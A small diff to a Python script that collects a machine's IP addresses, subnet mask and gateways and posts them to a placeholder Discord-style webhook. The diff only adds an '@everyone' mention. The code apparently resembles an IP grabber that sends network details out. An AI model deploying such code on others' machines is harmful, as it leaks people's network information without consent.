@@ -45,7 +45,7 @@ deafult_gateway_IPv6 = get_default_gateway_IPv6()
 webhook_url = "UR_WEBHOOK_URL"
 
 payload = {
-    "content": f"IPv6 Address = {IPv6}\nLink-local IPv6 Address = {Link_local_IPv6}\nIPv4 Address = {IPv4}\nSubnet Mask = {subnet_mask}\nDeafult Gateway IPv6 = {deafult_gateway_IPv6}\nDeafult Gateway IPv4 = {deafult_gateway_IPv4}"
+    "content": f"@everyone\nIPv6 Address = {IPv6}\nLink-local IPv6 Address = {Link_local_IPv6}\nIPv4 Address = {IPv4}\nSubnet Mask = {subnet_mask}\nDeafult Gateway IPv6 = {deafult_gateway_IPv6}\nDeafult Gateway IPv4 = {deafult_gateway_IPv4}"
 }
 
 response = requests.post(webhook_url, json=payload)
